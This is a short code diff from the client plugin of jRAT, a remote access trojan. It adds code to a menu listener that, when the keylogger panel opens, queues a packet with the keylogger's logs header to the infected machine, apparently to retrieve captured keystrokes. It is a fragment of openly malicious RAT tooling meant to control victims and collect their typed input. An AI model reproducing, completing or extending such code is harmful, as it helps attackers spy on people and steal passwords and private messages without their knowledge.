@@ -2,12 +2,15 @@ package pro.jrat.plugin.client;
 
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.util.List;
 
 import javax.swing.ImageIcon;
 import javax.swing.JFrame;
 
 import pro.jrat.api.BaseControlPanel;
+import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATMenuItemActionListener;
 import pro.jrat.api.RATObject;
 
@@ -44,6 +47,17 @@ public class MenuListener implements RATMenuItemActionListener {
 				frame.setLocationRelativeTo(null);
 				frame.add(panel);
 				frame.setVisible(true);
+				
+				try {
+					server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, server) {
+						@Override
+						public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
+							
+						}
+					});
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
